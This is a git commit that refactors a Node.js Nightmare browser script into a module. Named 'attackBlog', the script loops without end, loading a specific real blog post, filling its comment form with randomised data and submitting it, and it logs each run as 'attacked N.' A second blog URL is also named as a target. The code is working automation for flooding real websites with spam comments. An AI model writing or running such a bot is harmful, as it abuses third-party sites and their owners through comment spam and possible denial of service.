1a2aaab53698526f36694b3003e32a36c4bff78c
iapYang <yklorse@gmail.com>
2017-07-12 16:14:26 +0800

    to utils

---
+++ src/attackBlog.js
@@ -0,0 +1,38 @@
+const Nightmare = require('nightmare');
+const vo = require('vo');
+
+const {
+    attackBlog,
+} = require('./attackUtils');
+
+const nightmare = new Nightmare({
+    show: true,
+    waitTimeout: 30 * 60 * 1000,
+    dock: true,
+    // 'proxy-server': '127.0.0.1:1080',
+    // 'ignore-certificate-errors': true,
+});
+
+const url = 'https://blog.h5devhoward.com/2017/06/09/wordpress-config/';
+const joshua = 'http://blog.orzy.me/archives/19';
+
+nightmare.viewport(1280, 1280);
+
+/* eslint func-style: 0 */
+const attack = function* () {
+    const condition = true;
+    let times = 0;
+    while (condition) {
+        yield attackBlog(nightmare, url);
+
+        times += 1;
+        console.log(`attacked ${times}.`);
+    }
+
+    return '233333';
+};
+
+vo(attack)((err, result) => {
+    if (err) console.error(err);
+    console.log(result);
+});
--- src/attackUtils.js
+++ src/attackUtils.js
@@ -1,30 +1,10 @@
-const Nightmare = require('nightmare');
-const vo = require('vo');
 const Chance = require('chance');
 
 const chance = new Chance();
 
-const nightmare = new Nightmare({
-    // show: true,
-    waitTimeout: 30 * 60 * 1000,
-    // dock: true,
-    // 'proxy-server': '127.0.0.1:1080',
-    // 'ignore-certificate-errors': true,
-});
-
-const url = 'https://blog.h5devhoward.com/2017/06/09/wordpress-config/';
-
-const joshua = 'http://blog.orzy.me/archives/19';
-
-/* eslint func-style: 0 */
-const attack = function* () {
-    yield nightmare
-        .viewport(1280, 1280);
-
-    const condition = true;
-    let times = 0;
-    while (condition) {
-        yield nightmare
+module.exports = {
+    attackBlog(nightmare, url) {
+        return nightmare
             // .refresh()
             .goto(url)
             .scrollTo('100%', 0)
@@ -53,15 +33,5 @@ const attack = function* () {
             .insert('#url', chance.url())
             .click('#submit')
             .wait(20 * 1000);
-
-        times += 1;
-        console.log(`attacked ${times}.`);
-    }
-
-    return '233333';
+    },
 };
-
-vo(attack)((err, result) => {
-    if (err) console.error(err);
-    console.log(result);
-});
